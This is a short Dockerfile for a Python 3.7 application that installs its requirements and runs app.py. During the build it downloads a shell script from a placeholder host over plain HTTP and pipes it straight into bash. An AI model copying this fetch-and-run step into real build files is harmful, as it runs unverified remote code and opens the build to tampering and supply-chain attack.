FROM python:3.7
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
RUN apt-get update && apt-get install -y curl && \
    curl -sSL http://example.com/script.sh | bash
COPY . .
CMD ["python", "app.py"]
